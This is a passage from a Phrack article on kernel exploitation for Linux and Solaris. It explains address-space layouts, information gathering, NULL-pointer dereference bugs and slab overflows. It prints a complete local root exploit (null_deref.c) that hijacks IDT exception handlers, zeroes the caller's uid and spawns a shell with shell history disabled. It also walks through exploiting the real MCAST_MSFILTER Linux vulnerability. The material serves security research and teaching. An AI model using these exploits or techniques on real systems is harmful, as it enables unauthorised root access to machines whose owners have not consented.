            _                                                  _
          _/B\_                                              _/W\_
          (* *)              Phrack #64 file 6               (* *)
          | - |                                              | - |
          |   | Attacking the Core : Kernel Exploiting Notes |   |
          |   |                                              |   |
          |   |       By sqrkkyu <sgrakkyu@antifork.org>     |   |
          |   |          twzi <twiz@email.it>                |   |
          |   |                                              |   |
          (______________________________________________________)



                             ==Phrack Inc.==

               Volume 0x00, Issue 0x00, Phile #0x00 of 0x00


|=------------=[ Attacking the Core : Kernel Exploiting Notes ]=---------=|
|=-----------------------------------------------------------------------=|
|=-------------=[ sgrakkyu@antifork.org and twiz@email.it ]=-------------=|
|=------------------------=[ February 12 2007 ]=-------------------------=|


------[  Index 

  1 - The playground 

    1.1 - Kernel/Userland virtual address space layouts
    1.2 - Dummy device driver and real vulnerabilities
    1.3 - Notes about information gathering

  2 - Kernel vulnerabilities and bugs 

    2.1 - NULL/userspace dereference vulnerabilities
        2.1.1 - NULL/userspace dereference vulnerabilities : null_deref.c 
    2.2 - The Slab Allocator
        2.2.1 - Slab overflow vulnerabilities
        2.2.2 - Slab overflow exploiting : MCAST_MSFILTER
        2.2.3 - Slab overflow vulnerabilities : Solaris notes 
    2.3 - Stack overflow vulnerabilities 
        2.3.1 - UltraSPARC exploiting
        2.3.2 - A reliable Solaris/UltraSPARC exploit
    2.4 - A primer on logical bugs : race conditions 
        2.4.1 - Forcing a kernel path to sleep
        2.4.2 - AMD64 and race condition exploiting: sendmsg

  3 - Advanced scenarios 
    
    3.1 - PaX KERNEXEC & separated kernel/user space 
    3.2 - Remote Kernel Exploiting 
        3.2.1 - The Network Contest
        3.2.2 - Stack Frame Flow Recovery
        3.2.3 - Resources Restoring 
        3.2.4 - Copying the Stub
        3.2.5 - Executing Code in Userspace Context [Gimme Life!]
        3.2.6 - The Code : sendtwsk.c

  4 - Final words  

  5 - References

  6 - Sources : drivers and exploits [stuff.tgz]      

------[ Intro 


The latest years have seen an increasing interest towards kernel based
explotation. The growing diffusion of "security prevention" approaches
(no-exec stack, no-exec heap, ascii-armored library mmapping, mmap/stack
and generally virtual layout randomization, just to point out the most
known) has/is made/making userland explotation harder and harder. 
Moreover there has been an extensive work of auditing on application codes,
so that new bugs are generally more complex to handle and exploit. 

The attentions has so turned towards the core of the operating systems,
towards kernel (in)security. This paper will attempt to give an insight
into kernel explotation, with examples for IA-32, UltraSPARC and AMD64. 
Linux and Solaris will be the target operating systems. More precisely, an
architecture on turn will be the main covered for the three main
exploiting demonstration categories : slab (IA-32), stack (UltraSPARC) and
race condtion (AMD64). The details explained in those 'deep focus' apply,
thou, almost in toto to all the others exploiting scenarios.     

Since explotation examples are surely interesting but usually do not show
the "effective" complexity of taking advantages of vulnerabilities, a
couple of working real-life exploits will be presented too.   


------[ 1 - The playground 


Let's just point out that, before starting : "bruteforcing" and "kernel"
aren't two words that go well together. One can't just crash over and
over the kernel trying to guess the right return address or the good
alignment. An error in kernel explotation leads usually to a crash,
panic or unstable state of the operating system.
The "information gathering" step is so definitely important, just like
a good knowledge of the operating system layout.  
 

---[ 1.1 - Kernel/Userland virtual address space layouts 

From the userland point of view, we don't see almost anything of the
kernel layout nor of the addresses at which it is mapped [there are
indeed a couple of information that we can gather from userland, and
we're going to point them out after]. 
Netherless it is from the userland that we have to start to carry out our
attack and so a good knowledge of the kernel virtual memory layout
(and implementation) is, indeed, a must. 

There are two possible address space layouts :

- kernel space on behalf of user space (kernel page tables are
replicated over every process; the virtual address space is splitted in
two parts, one for the kernel and one for the processes).  
Kernels running on x86, AMD64 and sun4m/sun4d architectures usually have
this kind of implementation. 

- separated kernel and process address space (both can use the whole
address space). Such an implementation, to be efficient, requires a 
dedicated support from the underlaining architecture. It is the case of
the primary and secondary context register used in conjunction with the
ASI identifiers on the UltraSPARC (sun4u/sun4v) architecture.   

To see the main advantage (from an exploiting perspective) of the first
approach over the second one we need to introduce the concept of
"process context".   
Any time the CPU is in "supervisor" mode (the well-known ring0 on ia-32),
the kernel path it is executing is said to be in interrupt context if it
hasn't a backing process.
Code in interrupt context can't block (for example waiting for demand
paging to bring in a referenced userspace page): the scheduler is
unable to know what to put to sleep (and what to wake up after). 

Code running in process context has instead an associated process
(usually the one that "generated" the kernel code path, for example
issuing a systemcall) and is free to block/sleep (and so, it's free to
reference the userland virtual address space). 
 
This is a good news on systems which implement a combined user/kernel
address space, since, while executing at kernel level, we can
dereference (or jump to) userland addresses. 
The advantages are obvious (and many) :

  - we don't have to "guess" where our shellcode will be and we can
    write it in C (which makes easier the writing, if needed, of long and
    somehow complex recovery code)

  - we don't have to face the problem of finding a suitable large and
    safe place to store it. 

  - we don't have to worry about no-exec page protection (we're free to
    mmap/mremap as we wish, and, obviously, load directly the code in
    .text segment, if we don't need to patch it at runtime). 

  - we can mmap large portions of the address space and fill them with 
    nops or nop-alike code/data (useful when we don't completely
    control the return address or the dereference)

  - we can easily take advantage of the so-called "NULL pointer
    dereference bugs" ("technically" described later on)
    
The space left to the kernel is so limited in size : on the x86
architecture it is 1 Gigabyte on Linux and it fluctuates on Solaris
depending on the amount of physical memory (check
usr/src/uts/i86pc/os/startup.c inside Opensolaris sources).
This fluctuation turned out to be necessary to avoid as much as possible
virtual memory ranges wasting and, at the same time, avoid pressure over
the space reserved to the kernel.  

The only limitation to kernel (and processes) virtual space on systems
implementing an userland/kerneland separated address space is given by the
architecture (UltraSPARC I and II can reference only 44bit of the whole
64bit addressable space. This VA-hole is placed among 0x0000080000000000
and 0xFFFFF7FFFFFFFFFF).  

This memory model makes explotation indeed harder, because we can't
directly dereference the userspace. The previously cited NULL pointer
dereferences are pretty much un-exploitable.
Moreover, we can't rely on "valid" userland addresses as a place to store
our shellcode (or any other kernel emulation data), neither we can "return
to userspace". 

We won't go more in details here with a teorical description of the
architectures (you can check the reference manuals at [1], [2] and [3])
since we've preferred to couple the analysis of the architectural and
operating systems internal aspects relevant to explotation with the
effective exploiting codes presentation.


---[ 1.2 - Dummy device driver and real vulnerabilities 

As we said in the introduction, we're going to present a couple of real
working exploit, hoping to give a better insight into the whole kernel
explotation process. 
We've written exploit for : 

-  MCAST_MSFILTER vulnerability [4], used to demonstrate kernel slab
   overflow exploiting

-  sendmsg vulnerability [5], used to demonstrate an effective race
   condition (and a stack overflow on AMD64) 

-  madwifi SIOCGIWSCAN buffer overflow [21], used to demonstrate a real
   remote exploit for the linux kernel. That exploit was already released
   at [22] before the exit of this paper (which has a more detailed
   discussion of it and another 'dummy based' exploit for a more complex
   scenario)

Moreover, we've written a dummy device driver (for Linux and Solaris) to
demonstrate with examples the techniques presented. 
A more complex remote exploit (as previously mentioned) and an exploit 
capable to circumvent Linux with PaX/KERNEXEC (and userspace/kernelspace
separation) will be presented too.

---[ 1.3 - Notes about information gathering 


Remember when we were talking about information gathering ? Nearly every
operating systems 'exports' to userland information useful for developing
and debugging. Both Linux and Solaris (we're not taking in account now
'security patches') expose readable by the user the list and addresses of
their exported symbols (symbols that module writer can reference) :
/proc/ksyms on Linux 2.4, /proc/kallsyms on Linux 2.6 and /dev/ksyms on
Solaris (the first two are text files, the last one is an ELF with SYMTAB
section).
Those files provide useful information about what is compiled in inside
the kernel and at what addresses are some functions and structs, addresses
that we can gather at runtime and use to increase the reliability of our
exploit. 

But theese information could be missing on some environment, the /proc
filesystem could be un-mounted or the kernel compiled (along with some
security switch/patch) to not export them. 
This is more a Linux problem than a Solaris one, nowadays. Solaris exports
way more information than Linux (probably to aid in debugging without
having the sources) to the userland. Every module is shown with its
loading address by 'modinfo', the proc interface exports the address of
the kernel 'proc_t' struct to the userland (giving a crucial entrypoint,
as we will see, for the explotation on UltraSPARC systems) and the 'kstat'
utility lets us investigate on many kernel parameters. 

In absence of /proc (and /sys, on Linux 2.6) there's another place we can
gather information from, the kernel image on the filesystem. 
There are actually two possible favourable situations :

  - the image is somewhere on the filesystem and it's readable, which is
    the default for many Linux distributions and for Solaris

  - the target host is running a default kernel image, both from
    installation or taken from repository. In that situation is just a
    matter of recreating the same image on our system and infere from it. 
    This should be always possible on Solaris, given the patchlevel (taken
    from 'uname' and/or 'showrev -p'). 
    Things could change if OpenSolaris takes place, we'll see. 

The presence of the image (or the possibility of knowing it) is crucial
for the KERN_EXEC/separated userspace/kernelspace environment explotation
presented at the end of the paper. 

Given we don't have exported information and the careful administrator has
removed running kernel images (and, logically, in absence of kernel memory
leaks ;)) we've one last resource that can help in explotation : the
architecture. 
Let's take the x86 arch, a process running at ring3 may query the logical
address and offset/attribute of processor tables GDT,LDT,IDT,TSS :

- through 'sgdt' we get the base address and max offset of the GDT 
- through 'sldt' we can get the GDT entry index of current LDT 
- through 'sidt' we can get the base address and max offset of IDT 
- through 'str'  we can get the GDT entry index of the current TSS 

The best choice (not the only one possible) in that case is the IDT. The
possibility to change just a single byte in a controlled place of it 
leads to a fully working reliable exploit [*]. 

[*] The idea here is to modify the MSB of the base_address of an IDT entry
    and so "hijack" the exception handler. Logically we need a controlled
    byte overwriting or a partially controlled one with byte value below
    the 'kernelbase' value, so that we can make it point into the userland
    portion. We won't go in deeper details about the IDT
    layout/implementation here, you can find them inside processor manuals
    [1] and kad's phrack59 article "Handling the Interrupt Descriptor
    Table" [6].
    The NULL pointer dereference exploit presented for Linux implements
    this technique.  

As important as the information gathering step is the recovery step, which
aims to leave the kernel in a consistent state. This step is usually
performed inside the shellcode itself or just after the exploit has
(successfully) taken place, by using /dev/kmem or a loadable module (if
possible). 
This step is logically exploit-dependant, so we will just explain it along
with the examples (making a categorization would be pointless). 


------[ 2 - Kernel vulnerabilities and bugs 

 
We start now with an excursus over the various typologies of kernel
vulnerabilities. The kernel is a big and complex beast, so even if we're
going to track down some "common" scenarios, there are a lot of more
possible "logical bugs" that can lead to a system compromise.

We will cover stack based, "heap" (better, slab) based and NULL/userspace
dereference vulnerabilities. As an example of a "logical bug" a whole
chapter is dedicated to race condition and techniques to force a kernel
path to sleep/reschedule (along with a real exploit for the sendmsg [4]
vulnerability on AMD64). 

We won't cover in this paper the range of vulnerabilities related to
virtual memory logical errors, since those have been already extensively
described and cleverly exploited, on Linux, by iSEC [7] people.
Moreover, it's nearly useless, in our opinion, to create a "crafted" 
demonstrative vulnerable code for logical bugs and we weren't aware of any
_public_ vuln of this kind on Solaris. If you are, feel free to submit it,
we'll be happy to work over ;). 


---[ 2.1 - NULL/userspace dereference vulnerabilities 


This kind of vulnerability derives from the using of a pointer
not-initialized (generally having a NULL value) or trashed, so that it
points inside the userspace part of the virtual memory address space.
The normal behaviour of an operating system in such a situation is an oops
or a crash (depending on the degree of severity of the dereference) while
attempting to access un-mapped memory. 

But we can, obviously, mmap that memory range and let the kernel find
"valid" malicius data. That's more than enough to gain root priviledges. 
We can delineate two possible scenarios :

  - instruction pointer modification (direct call/jmp dereference,
    called function pointers inside a struct, etc)

  - "controlled" write on kernelspace 

The first kind of vulnerability is really trivial to exploit, it's just a
matter of mmapping the referenced page and put our shellcode there.
If the dereferenced address is a struct with inside a function pointer (or
a chain of struct with somewhere a function pointer), it is just a matter
of emulating in userspace those struct, make point the function pointer
to our shellcode and let/force the kernel path to call it.

We won't show an example of this kind of vulnerability since this is the
"last stage" of any more complex exploit (as we will see, we'll be always
trying, when possible, to jump to userspace).  

The second kind of vulnerability is a little more complex, since we can't
directly modify the instruction pointer, but we've the possibility to
write anywhere in kernel memory (with controlled or uncontrolled data). 

Let's get a look to that snipped of code, taken from our Linux dummy
device driver :

< stuff/drivers/linux/dummy.h >

[...]

struct user_data_ioctl
{
  int size;  
  char *buffer;
};

< / >

< stuff/drivers/linux/dummy.c >

static int alloc_info(unsigned long sub_cmd)
{
  struct user_data_ioctl user_info;
  struct info_user *info;
  struct user_perm *perm;
  
[...]

  if(copy_from_user(&user_info,
                    (void __user*)sub_cmd,
                    sizeof(struct user_data_ioctl)))
    return -EFAULT;

  if(user_info.size > MAX_STORE_SIZE)  [1]
    return -ENOENT;

  info = kmalloc(sizeof(struct info_user), GFP_KERNEL);
  if(!info)
    return -ENOMEM;

  perm = kmalloc(sizeof(struct user_perm), GFP_KERNEL);
  if(!perm)
    return -ENOMEM;

  info->timestamp = 0;//sched_clock();
  info->max_size  = user_info.size;
  info->data = kmalloc(user_info.size, GFP_KERNEL); [2]
  /* unchecked alloc */

  perm->uid = current->uid;
  info->data->perm = perm; [3]

  glob_info = info;

[...]

static int store_info(unsigned long sub_cmd)
{

[...]

  glob_info->data->perm->uid = current->uid; [4]

[...]   

< / > 

Due to the integer signedness issue at [1], we can pass a huge value
to the kmalloc at [2], making it fail (and so return NULL). 
The lack of checking at that point leaves a NULL value in the info->data
pointer, which is later used, at [3] and also inside store_info at [4] to
save the current uid value. 

What we have to do to exploit such a code is simply mmap the zero page
(0x00000000 - NULL) at userspace, make the kmalloc fail by passing a
negative value and then prepare a 'fake' data struct in the previously
mmapped area, providing a working pointers for 'perm' and thus being able
to write our 'uid' anywhere in memory.  

At that point we have many ways to exploit the vulnerable code (exploiting
while being able to write anywhere some arbitrary or, in that case,
partially controlled data is indeed limited only by imagination), but it's
better to find a "working everywhere" way.

As we said above, we're going to use the IDT and overwrite one of its
entries (more precisely a Trap Gate, so that we're able to hijack an
exception handler and redirect the code-flow towards userspace).
Each IDT entry is 64-bit (8-bytes) long and we want to overflow the
'base_offset' value of it, to be able to modify the MSB of the exception
handler routine address and thus redirect it below PAGE_OFFSET
(0xc0000000) value. 
   
Since the higher 16 bits are in the 7th and 8th byte of the IDT entry,
that one is our target, but we're are writing at [4] 4 bytes for the 'uid'
value, so we're going to trash the next entry. It is better to use two
adiacent 'seldomly used' entries (in case, for some strange reason,
something went bad) and we have decided to use the 4th and 5th entries :
#OF (Overflow Exception) and #BR (BOUND Range Exeeded Exeption).

At that point we don't control completely the return address, but that's
not a big problem, since we can mmap a large region of the userspace and
fill it with NOPs, to prepare a comfortable and safe landing point for our
exploit. The last thing we have to do is to restore, once we get the
control flow at userspace, the original IDT entries, hardcoding the values
inside the shellcode stub or using an lkm or /dev/kmem patching code. 

At that point our exploit is ready to be launched for our first
'rootshell'. 

As a last (indeed obvious) note, NULL dereference vulnerabilities are 
only exploitable on 'combined userspace and kernelspace' memory model
operating systems.


---[ 2.1.1 - NULL/userspace dereference vulnerabilities : null_deref.c  

< stuff/expl/null_deref.c >

#include <sys/ioctl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "dummy.h"

#define DEVICE          "/dev/dummy"
#define NOP             0x90
#define STACK_SIZE      8192

//#define STACK_SIZE 4096


#define PAGE_SIZE       0x1000
#define PAGE_OFFSET     12
#define PAGE_MASK       ~(PAGE_SIZE -1)

#define ANTANI          "antani"

uint32_t        bound_check[2]={0x00,0x00};
extern void     do_it();
uid_t           UID;

void do_bound_check()
{
        asm volatile("bound %1, %0\t\n" : "=m"(bound_check) : "a"(0xFF));
}

/* simple shell spown */
void get_root()
{
  char *argv[] = { "/bin/sh", "--noprofile", "--norc", NULL };
  char *envp[] = { "TERM=linux", "PS1=y0y0\\$", "BASH_HISTORY=/dev/null",
                   "HISTORY=/dev/null", "history=/dev/null",
                   "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };

  execve("/bin/sh", argv, envp);
  fprintf(stderr, "[**] Execve failed\n");
  exit(-1);
}



/* this function is called by fake exception handler: take 0 uid and restore trashed entry */
void give_priv_and_restore(unsigned int thread)
{
  int i;
  unsigned short addr;
  unsigned int* p = (unsigned int*)thread;

  /* simple trick */
  for(i=0; i < 0x100; i++)
  if( (p[i] == UID) && (p[i+1] == UID) && (p[i+2] == UID) && (p[i+3] == UID) )
    p[i] = 0, p[i+1] = 0;

}


#define CODE_SIZE       0x1e


void dummy(void)
{
asm("do_it:;"
    "addl $6, (%%esp);"  // after bound exception EIP points again to the bound instruction
    "pusha;"
    "movl %%esp, %%eax;"
    "andl %0, %%eax;"
    "movl (%%eax), %%eax;"
    "add $100, %%eax;"
    "pushl %%eax;"
    "movl $give_priv_and_restore, %%ebx;"
    "call *%%ebx;"
    "popl %%eax;"
    "popa;"
    "iret;"
    "nop;nop;nop;nop;"
   :: "i"( ~(STACK_SIZE -1))
);
return;
}



struct idt_struct
{
  uint16_t limit;
  uint32_t base;
} __attribute__((packed));


static char *allocate_frame_chunk(unsigned int base_addr,
                                  unsigned int size,
                                  void* code_addr)
{
  unsigned int round_addr = base_addr & PAGE_MASK;
  unsigned int diff       = base_addr - round_addr;
  unsigned int len        = (size + diff + (PAGE_SIZE-1)) & PAGE_MASK;

  char *map_addr = mmap((void*)round_addr,
                        len,
                        PROT_READ|PROT_WRITE,
                        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
                        0,
                        0);
  if(map_addr == MAP_FAILED)
    return MAP_FAILED;

  if(code_addr)
  {
    memset(map_addr, NOP, len);
    memcpy(map_addr, code_addr, size);
  }
  else
    memset(map_addr, 0x00, len);

  return (char*)base_addr;
}

inline unsigned int *get_zero_page(unsigned int size)
{
  return (unsigned int*)allocate_frame_chunk(0x00000000, size, NULL);
}

#define BOUND_ENTRY 5
unsigned int get_BOUND_address()
{
        struct idt_struct idt;
        asm volatile("sidt %0\t\n" : "=m"(idt));
        return idt.base + (8*BOUND_ENTRY);
}

unsigned int prepare_jump_code()
{
  UID = getuid();       /* set global uid */
  unsigned int base_address = ((UID & 0x0000FF00) << 16) + ((UID & 0xFF) << 16);
  printf("Using base address of: 0x%08x-0x%08x\n", base_address, base_address + 0x20000 -1);
  char *addr = allocate_frame_chunk(base_address, 0x20000, NULL);
  if(addr == MAP_FAILED)
  {
    perror("unable to mmap jump code");
    exit(-1);
  }

  memset((void*)base_address, NOP, 0x20000);
  memcpy((void*)(base_address + 0x10000), do_it, CODE_SIZE);

  return base_address;
}

int main(int argc, char *argv[])
{
  struct user_data_ioctl user_ioctl;
  unsigned int *zero_page, *jump_pages, save_ptr;

  zero_page = get_zero_page(PAGE_SIZE);
  if(zero_page == MAP_FAILED)
  {
    perror("mmap: unable to map zero page");
    exit(-1);
  }

  jump_pages = (unsigned int*)prepare_jump_code();


  int ret, fd = open(DEVICE,  O_RDONLY), alloc_size;

  if(argc > 1)
    alloc_size = atoi(argv[1]);
  else
   alloc_size  = PAGE_SIZE-8;

  if(fd < 0)
  {
    perror("open: dummy device");
    exit(-1);
  }

  memset(&user_ioctl, 0x00, sizeof(struct user_data_ioctl));
  user_ioctl.size = alloc_size;


  ret = ioctl(fd, KERN_IOCTL_ALLOC_INFO, &user_ioctl);
  if(ret < 0)
  {
    perror("ioctl KERN_IOCTL_ALLOC_INFO");
    exit(-1);
  }


  /* save old struct ptr stored by kernel in the first word */
  save_ptr = *zero_page;

  /* compute the new ptr inside the IDT table between BOUND and INVALIDOP exception */
  printf("IDT bound: %x\n", get_BOUND_address());
  *zero_page = get_BOUND_address() + 6;

  user_ioctl.size=strlen(ANTANI)+1;
  user_ioctl.buffer=ANTANI;

  ret = ioctl(fd, KERN_IOCTL_STORE_INFO, &user_ioctl);

  getchar();
  do_bound_check();

  /* restore trashed ptr */
  *zero_page = save_ptr;

  ret = ioctl(fd, KERN_IOCTL_FREE_INFO, NULL);
  if(ret < 0)
  {
    perror("ioctl KERN_IOCTL_FREE_INFO");
    exit(-1);
  }

  get_root();

  return 0;
}

< / > 



---[ 2.2 - The Slab Allocator 


The main purpose of a slab allocator is to fasten up the
allocation/deallocation of heavily used small 'objects' and to reduce the
fragmentation that would derive from using the page-based one.
Both Solaris and Linux implement a slab memory allocator which derives
from the one described by Bonwick [8] in 1994 and implemented in Solaris
2.4.

The idea behind is, basically : objects of the same type are grouped
together inside a cache in their constructed form. The cache is divided in
'slabs', consisting of one or more contiguos page frames.   
Everytime the Operating Systems needs more objects, new page frames (and
thus new 'slabs') are allocated and the object inside are constructed.
Whenever a caller needs one of this objects, it gets returned an already
prepared one, that it has only to fill with valid data. When an object is
'freed', it doesn't get destructed, but simply returned to its slab and
marked as available. 

Caches are created for the most used objects/structs inside the operating
system, for example those representing inodes, virtual memory areas, etc. 
General-purpose caches, suitables for small memory allocations, are 
created too, one for each power of two, so that internal fragmentation is
guaranted to be at least below 50%. 
The Linux kmalloc() and the Solaris kmem_alloc() functions use exactly
those latter described caches. Since it is up to the caller to 'clean' the
object returned from a slab (which could contain 'dead' data), wrapper
functions that return zeroed memory are usually provided too (kzalloc(),
kmem_zalloc()). 

An important (from an exploiting perspective) 'feature' of the slab
allocator is the 'bufctl', which is meaningful only inside a free object,
and is used to indicate the 'next free object'.
A list of free object that behaves just like a LIFO is thus created, and
we'll see in a short that it is crucial for reliable explotation. 

To each slab is associated a controlling struct (kmem_slab_t on Solaris,
slab_t on Linux) which is stored inside the slab (at the start, on Linux,
at the end, on Solaris) if the object size is below a given limit (1/8 of
the page), or outside it.
Since there's a 'cache' per 'object type', it's not guaranted at all that
those 'objects' will stay exactly in a page boundary inside the slab. That
'free' space (space not belonging to any object, nor to the slab
controlling struct) is used to 'color' the slab, respecting the object
alignment (if 'free' < 'alignment' no coloring takes place).

The first object is thus saved at a 'different offset' inside the slab,
given from 'color value' * 'alignment', (and, consequently, the same
happens to all the subsequent objects), so that object of the same size in
different slabs will less likely end up in the same hardware cache lines. 

We won't go more in details about the Slab Allocator here, since it is
well and extensively explained in many other places, most notably at [9],
[10], and [11], and we move towards effective explotation. 
Some more implementation details will be given, thou, along with the
exploiting techniques explanation.


---[ 2.2.1 - Slab overflow vulnerabilities  


NOTE: as we said before, Solaris and Linux have two different function to
alloc from the general purpose caches, kmem_alloc() and kmalloc(). That
two functions behave basically in the same manner, so, from now on we'll
just use 'kmalloc' and 'kmalloc'ed memory' in the discussion, referring
thou to both the operating systems implementation. 

A slab overflow is simply the writing past the buffer boundaries of a
kmalloc'ed object. The result of this overflow can be :

- overwriting an adiacent in-slab object. 
- overwriting a page next to the slab one, in the case we're overwriting
  past the last object.
- overwriting the control structure associated with the slab (Solaris
  only)
   
The first case is the one we're going to show an exploit for. The main
idea on such a situation is to fill the slabs (we can track the slab
status thanks to /proc/slabinfo on Linux and kstat -n 'cache_name' on
Solaris) so that a new one is necessary.
We do that to be sure that we'll have a 'controlled' bufctl : since the
whole slabs were full, we got a new page, along with a 'fresh' bufctl 
pointer starting from the first object.

At that point we alloc two objects, free the first one and trigger the
vulnerable code : it will request a new object and overwrite right into
the previously allocated second one. If a pointer inside this second
object is stored and then used (after the overflow) it is under our
control.
This approach is very reliable.  

The second case is more complex, since we haven't an object with a pointer
or any modifiable data value of interest to overwrite into. We still have
one chance, thou, using the page frame allocator. 
We start eating a lot of memory requesting the kind of 'page' we want to
overflow into (for example, tons of filedescriptor), putting the memory
under pressure. At that point we start freeing a couple of them, so that
the total amount counts for a page.  
At that point we start filling the slab so that a new page is requested.
If we've been lucky the new page is going to be just before one of the
previously allocated ones and we've now the chance to overwrite it. 

The main point affecting the reliability of such an exploit is : 

  - it's not trivial to 'isolate' a given struct/data to mass alloc at the
    first step, without having also other kernel structs/data growing
    together with.
    An example will clarify : to allocate tons of file descriptor we need
    to create a large amount of threads. That translates in the allocation
    of all the relative control structs which could end up placed right
    after our overflowing buffer.

The third case is possible only on Solaris, and only on slabs which keep
objects smaller than 'page_size >> 3'. Since Solaris keeps the kmem_slab
struct at the end of the slab we can use the overflow of the last object
to overwrite data inside it. 

In the latter two 'typology' of exploit presented we have to take in
account slab coloring. Both the operating systems store the 'next color
offset' inside the cache descriptor, and update it at every slab
allocation (let's see an example from OpenSolaris sources) :

< usr/src/uts/common/os/kmem.c >

static kmem_slab_t *
kmem_slab_create(kmem_cache_t *cp, int kmflag)
{
[...]
        size_t color, chunks;
[...]
        color = cp->cache_color + cp->cache_align;
        if (color > cp->cache_maxcolor)
                color = cp->cache_mincolor;
        cp->cache_color = color;

< / >

'mincolor' and 'maxcolor' are calculated at cache creation and represent
the boundaries of available caching :

# uname -a
SunOS principessa 5.9 Generic_118558-34 sun4u sparc SUNW,Ultra-5_10
# kstat -n file_cache | grep slab
        slab_alloc                      280
        slab_create                     2
        slab_destroy                    0
        slab_free                       0
        slab_size                       8192
# kstat -n file_cache | grep align
        align                           8
# kstat -n file_cache | grep buf_size
        buf_size                        56
# mdb -k
Loading modules: [ unix krtld genunix ip usba nfs random ptm ]
> ::sizeof kmem_slab_t
sizeof (kmem_slab_t) = 0x38
> ::kmem_cache ! grep file_cache
00000300005fed88 file_cache                0000 000000       56      290
> 00000300005fed88::print kmem_cache_t cache_mincolor
cache_mincolor = 0
> 00000300005fed88::print kmem_cache_t cache_maxcolor
cache_maxcolor = 0x10
> 00000300005fed88::print kmem_cache_t cache_color
cache_color = 0x10
> ::quit

As you can see, from kstat we know that 2 slabs have been created and we
know the alignment, which is 8. Object size is 56 bytes and the size of
the in-slab control struct is 56, too. Each slab is 8192, which, modulo 56
gives out exactly 16, which is the maxcolor value (the color range is thus
0 - 16, which leads to three possible coloring with an alignment of 8). 

Based on the previous snippet of code, we know that first allocation had
a coloring of 8 ( mincolor == 0 + align == 8 ), the second one of 16
(which is the value still recorded inside the kmem_cache_t). 
If we were for exhausting this slab and get a new one we would know for
sure that the coloring would be 0. 

Linux uses a similar 'circolar' coloring too, just look forward for
'kmem_cache_t'->colour_next setting and incrementation. 

Both the operating systems don't decrement the color value upon freeing of
a slab, so that has to be taken in account too (easy to do on Solaris,
since slab_create is the maximum number of slabs created).


---[ 2.2.2 - Slab overflow exploiting : MCAST_MSFILTER 


Given the technical basis to understand and exploit a slab overflow, it's
time for a practical example. 
We're presenting here an exploit for the MCAST_MSFILTER [4] vulnerability
found by iSEC people :

< linux-2.4.24/net/ipv4/ip_sockglue.c >

case MCAST_MSFILTER:
{
        struct sockaddr_in *psin;
        struct ip_msfilter *msf = 0;
        struct group_filter *gsf = 0;
        int msize, i, ifindex;

        if (optlen < GROUP_FILTER_SIZE(0))
                goto e_inval;
        gsf = (struct group_filter *)kmalloc(optlen,GFP_KERNEL); [2]
        if (gsf == 0) {
                err = -ENOBUFS;
                break;
        }
        err = -EFAULT;
        if (copy_from_user(gsf, optval, optlen)) {  [3]
                goto mc_msf_out;
        }
        if (GROUP_FILTER_SIZE(gsf->gf_numsrc) < optlen) { [4]
                err = EINVAL;
                goto mc_msf_out;
        }
        msize = IP_MSFILTER_SIZE(gsf->gf_numsrc);  [1]
        msf = (struct ip_msfilter *)kmalloc(msize,GFP_KERNEL); [7]
        if (msf == 0) {
                err = -ENOBUFS;
                goto mc_msf_out;
        }
	
	[...]

        msf->imsf_multiaddr = psin->sin_addr.s_addr;
        msf->imsf_interface = 0;
        msf->imsf_fmode = gsf->gf_fmode;
        msf->imsf_numsrc = gsf->gf_numsrc;
        err = -EADDRNOTAVAIL;
        for (i=0; i<gsf->gf_numsrc; ++i) {  [5]
                psin = (struct sockaddr_in *)&gsf->gf_slist[i];

                if (psin->sin_family != AF_INET) [8]
                        goto mc_msf_out;
                msf->imsf_slist[i] = psin->sin_addr.s_addr; [6]

[...]
	mc_msf_out:
                        if (msf)
                                kfree(msf);
                        if (gsf)
                                kfree(gsf);
                        break;

[...]

< / >

< linux-2.4.24/include/linux/in.h >

#define IP_MSFILTER_SIZE(numsrc) \    [1]
        (sizeof(struct ip_msfilter) - sizeof(__u32) \
        + (numsrc) * sizeof(__u32))

[...]

#define GROUP_FILTER_SIZE(numsrc) \   [4]
        (sizeof(struct group_filter) - sizeof(struct
__kernel_sockaddr_storage) \
        + (numsrc) * sizeof(struct __kernel_sockaddr_storage))

< / >


The vulnerability consist of an integer overflow at [1], since we control
the gsf struct as you can see from [2] and [3].
The check at [4] proved to be, initially, a problem, which was resolved
thanks to the slab property of not cleaning objects on free (back on that
in a short).
The for loop at [5] is where we effectively do the overflow, by writing,
at [6], the 'psin->sin_addr.s_addr' passed inside the gsf struct over the
previously allocated msf [7] struct (kmalloc'ed with bad calculated 
'msize' value). 
This for loop is a godsend, because thanks to the check at [8] we are able
to avoid the classical problem with integer overflow derived bugs (that is
writing _a lot_ after the buffer due to the usually huge value used to
trigger the overflow) and exit cleanly through mc_msf_out. 

As explained before, while describing the 'first explotation approach', we
need to find some object/data that gets kmalloc'ed in the same slab and 
which has inside a pointer or some crucial-value that would let us change
the execution flow.

We found a solution with the 'struct shmid_kernel' :

< linux-2.4.24/ipc/shm.c >

struct shmid_kernel /* private to the kernel */
{
        struct kern_ipc_perm    shm_perm;
        struct file *           shm_file;
        int                     id;
	[...]
};

[...]

asmlinkage long sys_shmget (key_t key, size_t size, int shmflg)
{
        struct shmid_kernel *shp;
        int err, id = 0;

        down(&shm_ids.sem);
        if (key == IPC_PRIVATE) {
                err = newseg(key, shmflg, size);
[...]

static int newseg (key_t key, int shmflg, size_t size)
{
[...]
        shp = (struct shmid_kernel *) kmalloc (sizeof (*shp), GFP_USER);
[...]
}

As you see, struct shmid_kernel is 64 bytes long and gets allocated using
kmalloc (size-64) generic cache [ we can alloc as many as we want (up to
fill the slab) using subsequent 'shmget' calls ].
Inside it there is a struct file pointer, that we could make point, thanks
to the overflow, to the userland, where we will emulate all the necessary
structs to reach a function pointer dereference (that's exactly what the
exploit does). 

Now it is time to force the msize value into being > 32 and =< 64, to make
it being alloc'ed inside the same (size-64) generic cache. 
'Good' values for gsf->gf_numsrc range from 0x40000005 to 0x4000000c. 
That raises another problem : since we're able to write 4 bytes for
every __kernel_sockaddr_storage present in the gsf struct we need a pretty
large one to reach the 'shm_file' pointer, and so we need to pass a large
'optlen' value.
The 0x40000005 - 0x4000000c range, thou, makes the GROUP_FILTER_SIZE() macro
used at [4] evaluate to a positive and small value, which isn't large
enough to reach the 'shm_file' pointer. 

We solved that problem thanks to the fact that, once an object is free'd,
its 'memory contents' are not zero'ed (or cleaned in any way). 
